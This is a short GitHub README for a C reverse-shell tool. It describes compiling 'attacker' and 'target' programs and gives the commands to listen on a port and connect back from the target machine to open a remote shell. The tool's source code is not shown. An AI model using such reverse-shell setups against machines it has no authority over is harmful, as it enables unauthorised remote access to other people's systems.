# reverseShell
[![GitHub Issues](https://img.shields.io/github/issues/Yashvendra/reverseShell.svg?label=Issues)](https://www.github.com/Yashvendra/reverseShell/issues)
[![contributions welcome](https://img.shields.io/badge/contributions-welcome-brightgreen.svg?style=flat&label=Contributions&colorA=blue&colorB=black	)](#)

👨‍💻 Script in C which after compiling can be used by an 
**Attacker** 
to gain a shell of
**Target** 
machine.

## Usage
Firstly, you should compile the above C programs. In my case I used `g++` compiler and gave the output files name as `attacker` and `target` respectively.
### 1. Setup a server and listen for incoming connections.
On your machine setup a server and start listening on a port.

``` 
./attacker 1234
```

### 2. Execute client script on target and setup a connection to the server
You can do this by simply executing the target compiled file

```
./target 192.168.0.2 1234
```

Now you should have gained a shell on the server machine.

## Demo
![Alt Text](https://github.com/Yashvendra/reverseShell/blob/master/Demo/video-gif.gif)

## License
MIT © y_k_007

